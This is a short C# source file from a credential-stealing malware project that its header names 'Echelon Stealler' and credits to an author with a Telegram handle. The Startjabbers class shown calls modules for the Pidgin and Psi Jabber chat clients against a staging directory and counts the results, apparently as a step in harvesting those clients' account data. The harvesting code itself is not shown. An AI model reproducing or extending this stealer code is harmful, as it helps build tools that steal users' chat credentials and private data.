///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Echelon
{
    class Startjabbers
    {
        public static int count = 0;
        public static int Start(string Echelon_Dir)
        {
            Pidgin.Start(Echelon_Dir); 
            Psi.Start(Echelon_Dir); 
        
            return count;
        }
    }
}
